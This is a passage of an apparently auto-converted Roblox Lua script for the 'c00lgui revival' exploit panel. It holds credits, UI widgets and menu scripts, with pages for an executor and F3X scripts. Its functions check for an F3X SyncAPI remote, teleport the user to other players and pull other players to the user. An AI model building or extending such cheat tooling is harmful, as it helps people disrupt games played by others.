G2L["175"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["175"]["Text"] = [[Itseverydayyou - Current owner of Nameless Admin]];
G2L["175"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["176"] = Instance.new("TextLabel", G2L["170"]);
G2L["176"]["TextWrapped"] = true;
G2L["176"]["Active"] = true;
G2L["176"]["BorderSizePixel"] = 2;
G2L["176"]["TextSize"] = 14;
G2L["176"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["176"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["176"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["176"]["BackgroundTransparency"] = 1;
G2L["176"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["176"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["176"]["Text"] = [[LEETCyanide - team c00lkidd 2 Administrator, Scripter, Commercial Pilot]];
G2L["176"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["177"] = Instance.new("TextLabel", G2L["170"]);
G2L["177"]["TextWrapped"] = true;
G2L["177"]["Active"] = true;
G2L["177"]["BorderSizePixel"] = 2;
G2L["177"]["TextSize"] = 14;
G2L["177"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["177"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["177"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["177"]["BackgroundTransparency"] = 1;
G2L["177"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["177"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["177"]["Text"] = [[M3RCY - team c00lkidd revival Admin, Hyperion's friend]];
G2L["177"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["178"] = Instance.new("TextLabel", G2L["170"]);
G2L["178"]["TextWrapped"] = true;
G2L["178"]["Active"] = true;
G2L["178"]["BorderSizePixel"] = 2;
G2L["178"]["TextSize"] = 14;
G2L["178"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["178"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["178"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["178"]["BackgroundTransparency"] = 1;
G2L["178"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["178"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["178"]["Text"] = [[jonas - Former team c00lkidd 2 owner]];
G2L["178"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["179"] = Instance.new("TextLabel", G2L["170"]);
G2L["179"]["TextWrapped"] = true;
G2L["179"]["Active"] = true;
G2L["179"]["BorderSizePixel"] = 2;
G2L["179"]["TextSize"] = 14;
G2L["179"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["179"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["179"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["179"]["BackgroundTransparency"] = 1;
G2L["179"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["179"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["179"]["Text"] = [[ADHDYoshi - team c00lkidd 2 Group Holder]];
G2L["179"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["17a"] = Instance.new("TextLabel", G2L["170"]);
G2L["17a"]["TextWrapped"] = true;
G2L["17a"]["Active"] = true;
G2L["17a"]["BorderSizePixel"] = 2;
G2L["17a"]["TextSize"] = 14;
G2L["17a"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["17a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17a"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["17a"]["BackgroundTransparency"] = 1;
G2L["17a"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["17a"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["17a"]["Text"] = [[007n7 - Original creator of team c00lkidd, c00lkidd, and c00lgui]];
G2L["17a"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Pages.Credits.SpecialPeople.Credit
G2L["17b"] = Instance.new("TextLabel", G2L["170"]);
G2L["17b"]["TextWrapped"] = true;
G2L["17b"]["Active"] = true;
G2L["17b"]["BorderSizePixel"] = 2;
G2L["17b"]["TextSize"] = 14;
G2L["17b"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["17b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17b"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["17b"]["BackgroundTransparency"] = 1;
G2L["17b"]["Size"] = UDim2.new(0, 385, 0, 25);
G2L["17b"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["17b"]["Text"] = [[You - being c00l]];
G2L["17b"]["Name"] = [[Credit]];


-- StarterGui.c00lguiSE.Main.Overlay
G2L["17c"] = Instance.new("TextButton", G2L["2"]);
G2L["17c"]["Active"] = false;
G2L["17c"]["Interactable"] = false;
G2L["17c"]["BorderSizePixel"] = 0;
G2L["17c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17c"]["AutoButtonColor"] = false;
G2L["17c"]["TextSize"] = 14;
G2L["17c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17c"]["Selectable"] = false;
G2L["17c"]["ZIndex"] = 2;
G2L["17c"]["Size"] = UDim2.new(0, 404, 0, 250);
G2L["17c"]["BackgroundTransparency"] = 1;
G2L["17c"]["Name"] = [[Overlay]];
G2L["17c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17c"]["Text"] = [[]];
G2L["17c"]["Position"] = UDim2.new(0, 0, -0, 0);


-- StarterGui.c00lguiSE.Main.UIDrag
G2L["17d"] = Instance.new("LocalScript", G2L["2"]);
G2L["17d"]["Name"] = [[UIDrag]];


-- StarterGui.c00lguiSE.Version
G2L["17e"] = Instance.new("StringValue", G2L["1"]);
G2L["17e"]["Name"] = [[Version]];
G2L["17e"]["Value"] = [[1.2]];


-- StarterGui.c00lguiSE.Maximize
G2L["17f"] = Instance.new("TextButton", G2L["1"]);
G2L["17f"]["BorderSizePixel"] = 0;
G2L["17f"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["17f"]["TextSize"] = 16;
G2L["17f"]["BackgroundColor3"] = Color3.fromRGB(37, 37, 37);
G2L["17f"]["RichText"] = true;
G2L["17f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["17f"]["Size"] = UDim2.new(0, 20, 0, 21);
G2L["17f"]["Name"] = [[Maximize]];
G2L["17f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17f"]["Text"] = [[+]];
G2L["17f"]["Visible"] = false;
G2L["17f"]["Position"] = UDim2.new(-0.00016, 0, 0.66069, 0);


-- StarterGui.c00lguiSE.LocalScript
G2L["180"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.c00lguiSE.Load
G2L["181"] = Instance.new("LocalScript", G2L["1"]);
G2L["181"]["Name"] = [[Load]];


-- StarterGui.c00lguiSE.TestBuild
G2L["182"] = Instance.new("BoolValue", G2L["1"]);
G2L["182"]["Name"] = [[TestBuild]];


-- StarterGui.c00lguiSE.SoundFeedback
G2L["183"] = Instance.new("LocalScript", G2L["1"]);
G2L["183"]["Name"] = [[SoundFeedback]];


-- StarterGui.c00lguiSE.Sounds
G2L["184"] = Instance.new("Folder", G2L["1"]);
G2L["184"]["Name"] = [[Sounds]];


-- StarterGui.c00lguiSE.Sounds.Sound1
G2L["185"] = Instance.new("Sound", G2L["184"]);
G2L["185"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["185"]["Name"] = [[Sound1]];
G2L["185"]["SoundId"] = [[rbxassetid://156785206]];


-- StarterGui.c00lguiSE.Sounds.Sound2
G2L["186"] = Instance.new("Sound", G2L["184"]);
G2L["186"]["PlaybackSpeed"] = 0.8;
G2L["186"]["Volume"] = 1;
G2L["186"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["186"]["Name"] = [[Sound2]];
G2L["186"]["SoundId"] = [[rbxassetid://145487017]];


-- StarterGui.c00lguiSE.Sounds.Sound3
G2L["187"] = Instance.new("Sound", G2L["184"]);
G2L["187"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["187"]["Name"] = [[Sound3]];
G2L["187"]["SoundId"] = [[rbxassetid://243152215]];


-- StarterGui.c00lguiSE.Sounds.Sound4
G2L["188"] = Instance.new("Sound", G2L["184"]);
G2L["188"]["PlaybackSpeed"] = 1.25;
G2L["188"]["Volume"] = 1;
G2L["188"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["188"]["Name"] = [[Sound4]];
G2L["188"]["SoundId"] = [[rbxassetid://145487017]];


-- StarterGui.c00lguiSE.Sounds.Sound5
G2L["189"] = Instance.new("Sound", G2L["184"]);
G2L["189"]["PlaybackSpeed"] = 1.2;
G2L["189"]["Volume"] = 1;
G2L["189"]["RollOffMode"] = Enum.RollOffMode.InverseTapered;
G2L["189"]["Name"] = [[Sound5]];
G2L["189"]["SoundId"] = [[rbxassetid://145487017]];


-- StarterGui.c00lguiSE.Main.MenuOpen.LocalScript
local function C_4()
local script = G2L["4"];
	local button = script.Parent
	local menu = script.Parent.Parent.PageSelect
	local overlay = button.Parent.Overlay
	local TweenService = game:GetService("TweenService")
	local GuiService = game:GetService("GuiService")
	
	local minsize = UDim2.new(0, 0, 0, 250)
	local maxsize = UDim2.new(0, 129, 0, 250)
	local waittime = 0.3
	
	local minimized = menu.minimized
	
	function toggle()
		minimized.Value = not menu.Visible
	
		if minimized.Value then
			menu.Visible = true
			TweenService:Create(menu, TweenInfo.new(waittime), {Size = maxsize}):Play()
			TweenService:Create(overlay, TweenInfo.new(waittime), {BackgroundTransparency = 0.3}):Play()
			overlay.Interactable = true
			overlay.Active = true
			button.Selectable = false
			button.Active = false
			button.Interactable = false
		else
			TweenService:Create(menu, TweenInfo.new(waittime - 0.1), {Size = minsize}):Play()
			TweenService:Create(overlay, TweenInfo.new(waittime), {BackgroundTransparency = 1}):Play()
			task.wait(waittime)
			menu.Visible = false
			overlay.Interactable = false
			overlay.Active = false
			button.Selectable = true
			button.Active = true
			button.Interactable = true
		end
	
		minimized.Value = not minimized.Value
	end
	
	
	button.MouseButton1Click:Connect(toggle)
	overlay.MouseButton1Click:Connect(toggle)
	
	GuiService.MenuOpened:Connect(function()
		if not minimized.Value then
			toggle()
		end
	end)
	
end;
task.spawn(C_4);
-- StarterGui.c00lguiSE.Main.PageSelect.Title.LocalScript
local function C_b()
local script = G2L["b"];
	script.Parent.Text = "c00lgui revival v"..script.Parent.Parent.Parent.Parent.Version.Value
	
	local TweenService = game:GetService("TweenService")
	local title = script.Parent
	
	local originalColor = title.TextColor3
	local newColor = Color3.fromRGB(155, 0, 0) -- change this if you want
	
	while true do
		TweenService:Create(title, TweenInfo.new(1), {TextColor3 = newColor}):Play()
		wait(1)
		TweenService:Create(title, TweenInfo.new(1), {TextColor3 = originalColor}):Play()
		wait(1)
	end
	
end;
task.spawn(C_b);
-- StarterGui.c00lguiSE.Main.PageSelect.Home.ButtonScript
local function C_d()
local script = G2L["d"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Home"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_d);
-- StarterGui.c00lguiSE.Main.PageSelect.Admin Commands/GUIs.ButtonScript
local function C_f()
local script = G2L["f"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Admin Commands/GUIs"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_f);
-- StarterGui.c00lguiSE.Main.PageSelect.Players.ButtonScript
local function C_11()
local script = G2L["11"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Players"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_11);
-- StarterGui.c00lguiSE.Main.PageSelect.LocalPlayer.ButtonScript
local function C_13()
local script = G2L["13"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["LocalPlayer"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_13);
-- StarterGui.c00lguiSE.Main.PageSelect.Scripts.ButtonScript
local function C_15()
local script = G2L["15"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Scripts"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_15);
-- StarterGui.c00lguiSE.Main.PageSelect.F3X Scripts.ButtonScript
local function C_17()
local script = G2L["17"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	local found = false
	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("BindableFunction") and v.Name == "SyncAPI" then
			found = true
			break
		end
	end
	
	if not found then
		button.Visible = false
	end
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["F3X"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_17);
-- StarterGui.c00lguiSE.Main.PageSelect.Music.ButtonScript
local function C_19()
local script = G2L["19"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Music"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_19);
-- StarterGui.c00lguiSE.Main.PageSelect.Gears.ButtonScript
local function C_1b()
local script = G2L["1b"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Gears"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_1b);
-- StarterGui.c00lguiSE.Main.PageSelect.Executor.ButtonScript
local function C_1d()
local script = G2L["1d"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Executor"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_1d);
-- StarterGui.c00lguiSE.Main.PageSelect.Misc..ButtonScript
local function C_1f()
local script = G2L["1f"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Misc."].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_1f);
-- StarterGui.c00lguiSE.Main.PageSelect.Settings.ButtonScript
local function C_21()
local script = G2L["21"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Settings"].Visible = true
		pages["Asset Viewer"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_21);
-- StarterGui.c00lguiSE.Main.PageSelect.Credits.ButtonScript
local function C_23()
local script = G2L["23"];
	local button = script.Parent
	local pages = script.Parent.Parent.Parent.Pages
	local pagetitle = script.Parent.Parent.Parent.PageTitle
	local tweenservice = game:GetService("TweenService")
	
	local originalColor = button.BackgroundColor3
	
	function hover()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = Color3.fromRGB(255, 0, 0)}
		)
		tween:Play()
	end
	
	function click()
		script.Parent.Parent.minimized.Value = true
		for i,v in pairs(pages:GetChildren()) do
			v.Visible = false
		end
		pages["Credits"].Visible = true
		pagetitle.Text = button.Name
	end
	
	button.MouseEnter:Connect(hover)
	button.MouseButton1Click:Connect(click)
	button.MouseLeave:Connect(function()
		local tween = tweenservice:Create(
			button,
			TweenInfo.new(0.2),
			{BackgroundColor3 = originalColor}
		)
		tween:Play()
	end)
	
end;
task.spawn(C_23);
-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent.LocalScript
local function C_28()
local script = G2L["28"];
	local Players = game:GetService("Players")
	
	local player = Players.LocalPlayer
	
	local userId = player.UserId
	local thumbType = Enum.ThumbnailType.HeadShot
	local thumbSize = Enum.ThumbnailSize.Size420x420
	local content, isReady = Players:GetUserThumbnailAsync(userId, thumbType, thumbSize)
	
	local imageLabel = script.Parent
	imageLabel.Image = content
end;
task.spawn(C_28);
-- StarterGui.c00lguiSE.Main.Pages.Home.UserContent.WelcomeText.LocalScript
local function C_2b()
local script = G2L["2b"];
	local greetings = {
		"Hey",
		"Hello",
		"Hi there",
		"Howdy",
		"Yo",
		"Sup",
		"Heyo",
		"Hiya",
		"Welcome",
		"Greetings",
		"Hi"
	}
	
	local verifiedUsers = {
		["hyperionhx"] = true,
		["hyperionhax"] = true,
		["Hyperionaltx"] = true,
		["Hyperionalty"] = true,
		["Hyperionaltz"] = true,
		["KebinMasterTestAcc"] = true,
		["KebinMasterAlt"] = true,
		["request5924523638747"] = true,
		["plantiscool123jk"] = true,
		["AnnualBuilderman"] = true
	}
	
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
	
	local greeting = greetings[math.random(1, #greetings)]
	
	local unicode = ""
	if verifiedUsers[player.Name] then
		unicode = utf8.char(0xE000)
	end
	
	script.Parent.Text = greeting .. ", " .. player.DisplayName .. "!" .. unicode
	
end;
task.spawn(C_2b);
-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.GameID.LocalScript
local function C_2f()
local script = G2L["2f"];
	script.Parent.Text = "Place ID: " .. game.GameId
	
end;
task.spawn(C_2f);
-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.PlayerCount.LocalScript
local function C_31()
local script = G2L["31"];
	script.Parent.Text = "Server Size: " .. #game.Players:GetPlayers()
end;
task.spawn(C_31);
-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.RFECheck.LocalScript
local function C_33()
local script = G2L["33"];
	script.Parent.Text = "RFE: " .. tostring(game:GetService("SoundService").RespectFilteringEnabled)
	
end;
task.spawn(C_33);
-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.ServerTime.LocalScript
local function C_35()
local script = G2L["35"];
	while true do
		local t = workspace.DistributedGameTime
	
		local hours = math.floor(t / 3600)
		local minutes = math.floor((t % 3600) / 60)
		local seconds = math.floor(t % 60)
	
		script.Parent.Text = string.format("Server Time: %02d:%02d:%02d", hours, minutes, seconds)
		wait(1)
	end
end;
task.spawn(C_35);
-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.RigType.LocalScript
local function C_37()
local script = G2L["37"];
	local player = game.Players.LocalPlayer
	
	local function updateAvatar()
		local character = player.Character or player.CharacterAdded:Wait()
		local humanoid = character:WaitForChild("Humanoid")
		script.Parent.Text = "Avatar Type: " .. humanoid.RigType.Name
	end
	
	updateAvatar()
	player.CharacterAdded:Connect(updateAvatar)
	
end;
task.spawn(C_37);
-- StarterGui.c00lguiSE.Main.Pages.Home.HomeInfo.FPS.LocalScript
local function C_39()
local script = G2L["39"];
	local RunService = game:GetService("RunService")
	
	RunService.RenderStepped:Connect(function(dt)
		local fps = math.floor(1 / dt)
		script.Parent.Text = "FPS: " .. fps
	end)
	
	
end;
task.spawn(C_39);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_3e()
local script = G2L["3e"];
	local button = script.Parent
	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			table.insert(results, game.Players.LocalPlayer)
		elseif name == "others" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					table.insert(results, plr)
				end
			end
		elseif name == "all" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				table.insert(results, plr)
			end
		else
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	
	button.MouseButton1Click:connect(function()
		local Target = getPlr(input.Text)
		if Target[1] then
			Target = Target[1]
	
	
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
			game:FindService("RunService").Heartbeat:wait()
		end
	end)
end;
task.spawn(C_3e);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_40()
local script = G2L["40"];
	local button = script.Parent
	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	
	function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			table.insert(results, game.Players.LocalPlayer)
		elseif name == "others" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					table.insert(results, plr)
				end
			end
		elseif name == "all" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				table.insert(results, plr)
			end
		else
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	
	function getPlrChar(plr)
		return plr.Character
	end
	
	function getRoot(char)
		return char:FindFirstChild("HumanoidRootPart")
	end
	
	function getChar()
		local lp = game.Players.LocalPlayer
		return lp and lp.Character or nil
	end
	
	
	button.MouseButton1Click:Connect(function()
		local username = input.Text
		local target = getPlr(username)
		if #target == 0 then return end
		local localChar = getChar()
		if not localChar then return end
		local localRoot = getRoot(localChar)
		if not localRoot then return end
		for _, plr in next, target do
			local targetChar = getPlrChar(plr)
			if targetChar then
				local targetRoot = getRoot(targetChar)
				if targetRoot then
					targetRoot.CFrame = localRoot.CFrame + localRoot.CFrame.LookVector * 3
				end
			end
		end
	end)
	
end;
task.spawn(C_40);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_42()
local script = G2L["42"];
	local button = script.Parent
	local Players = game.Players
	local Player = Players.LocalPlayer
